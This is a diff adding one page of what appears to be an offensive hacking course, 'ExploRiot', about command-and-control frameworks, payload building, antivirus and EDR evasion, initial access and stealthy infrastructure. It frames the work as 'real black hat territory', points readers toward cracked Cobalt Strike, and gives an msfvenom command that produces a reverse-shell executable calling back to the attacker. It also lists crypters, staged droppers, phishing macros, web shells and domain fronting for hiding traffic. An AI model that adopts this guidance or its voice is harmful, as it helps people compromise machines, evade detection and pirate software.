@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ExploRiot - Phase 4: Persistence & Payloads</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="phase-title-container">
+            <h1 class="phase-number">PHASE 4</h1>
+            <h1 class="phase-name">PERSISTENCE INFRASTRUCTURE & PAYLOAD DEV</h1>
+        </div>
+
+        <div class="objective-box">
+            <p>Be the fucking spider. Not the fly. You build the trap, control the web, and they dance for you.</p>
+        </div>
+
+        <h2>🔥 1. Command & Control (C2) Frameworks</h2>
+        <p>This is how you manage infected machines — get shells, exfiltrate data, escalate. Real black hat territory.</p>
+        <h3>🧠 Top C2s You Need to Know:</h3>
+        <ul>
+            <li><strong>🐍 <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit / Meterpreter</a></strong>
+                <ul><li>Beginner-friendly, powerful</li><li><code>msfvenom</code> for payload crafting</li><li>Tons of post-exploitation modules</li></ul>
+            </li>
+            <li><strong>☠️ <a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener noreferrer">Empire</a> / <a href="https://github.com/BC-SECURITY/Starkiller" target="_blank" rel="noopener noreferrer">Starkiller</a></strong>
+                <ul><li>PowerShell-based C2</li><li>Ideal for Windows environments</li><li>Starkiller is its GUI front-end</li></ul>
+            </li>
+            <li><strong>🦈 <a href="https://github.com/cobbr/Covenant" target="_blank" rel="noopener noreferrer">Covenant</a></strong>
+                <ul><li>.NET C2 framework</li><li>Targets modern Windows stacks</li><li>Comes with HTTPS support</li></ul>
+            </li>
+            <li><strong>🪓 <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener noreferrer">Cobalt Strike</a></strong> (Commercial - Cracked Editions Exist)
+                <ul><li>The GOAT for nation-state tier ops</li><li>Beacon = stealthy, in-memory shell</li><li>OPSEC features, pivoting, sleep timers, everything</li><li>Want it? Go dig — it ain’t officially free.</li></ul>
+            </li>
+            <li><strong>🧬 <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener noreferrer">Sliver</a> (by BishopFox)</strong>
+                <ul><li>Open-source, supports GoLang payloads</li><li>Modern, cross-platform, encrypted C2</li></ul>
+            </li>
+        </ul>
+
+        <h2>🧫 2. Payload Development (Droppers & Bypasses)</h2>
+
+        <h3>🧱 Raw Payloads</h3>
+        <p>Craft with:</p>
+        <pre><code>msfvenom -p windows/meterpreter/reverse_https LHOST=you LPORT=443 -f exe > shell.exe</code></pre>
+        <p>But that gets caught. So…</p>
+
+        <h3>🧬 3. Evasion: AV & EDR Bypass</h3>
+        <h4>🧰 Obfuscators:</h4>
+        <ul>
+            <li><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener noreferrer">Veil-Evasion</a> (May be outdated, concept still relevant)</li>
+            <li><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener noreferrer">Shellter</a> (Often used for PE injection)</li>
+            <li>Custom obfuscation via Python/C#/Go</li>
+        </ul>
+        <h4>🔧 Crypters:</h4>
+        <ul>
+            <li>Encrypt your payload and decrypt in-memory</li>
+            <li>XOR, AES, base64 chaining</li>
+            <li>Use <a href="https://github.com/optiv/ScareCrow" target="_blank" rel="noopener noreferrer">ScareCrow</a> or <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener noreferrer">Donut</a> for payload generation</li>
+        </ul>
+        <h4>🛠️ Staged Execution:</h4>
+        <ul>
+            <li>Initial Dropper: Small loader (JS/VBS/HTA) to pull stage 2</li>
+            <li>Stage 2: Bigger encrypted binary with the real payload</li>
+        </ul>
+
+        <h2>🕵️ 4. Initial Access Vectors</h2>
+        <ul>
+            <li>Phishing (Office Macros, PDFs with payloads)</li>
+            <li>Exploit Kits (e.g., RIG, GrandSoft - Often requires finding active ones)</li>
+            <li>Watering Hole Attacks</li>
+            <li>Web Shells (PHP, ASPX, JSP)</li>
+        </ul>
+
+        <h2>🗃️ 5. OPSEC + Persistence Infra</h2>
+        <ul>
+            <li>Use cloud servers with rotating IPs (AWS, Azure free tiers)</li>
+            <li>Domain fronting (hide traffic via Google, Cloudflare - effectiveness varies)</li>
+            <li>Use <a href="https://ngrok.com/" target="_blank" rel="noopener noreferrer">ngrok</a> or custom reverse proxies for stealth</li>
+            <li>Encrypt traffic always (TLS, HTTPS C2)</li>
+        </ul>
+
+        <h2>🧪 6. Practice it like a monster:</h2>
+        <ul>
+            <li>Sliver + Ngrok lab</li>
+            <li>Red Team Attack Simulation Lab (e.g., on TryHackMe, HackTheBox)</li>
+            <li>Detection Evasion Labs (Search for specific platforms/tools)</li>
+        </ul>
+
+        <div class="back-button-container">
+            <a href="index.html" class="back-button">Back to Index</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        ExploRiot &copy; 2025
+    </footer>
+</body>
+</html>
